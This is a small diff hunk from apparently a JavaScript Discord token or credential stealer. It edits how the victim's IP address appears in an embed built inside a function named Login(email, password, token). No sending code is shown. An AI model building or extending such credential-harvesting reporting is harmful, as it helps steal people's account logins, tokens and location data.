@@ -221,7 +221,7 @@ function Login(email, password, token) {
 
                         {
                             "name": ":globe_with_meridians: | Ip :",
-                            "value": `\`${ip}\``,
+                            "value": `Ip: \`${ip}\``,
                             "inline": false
                             
                         }
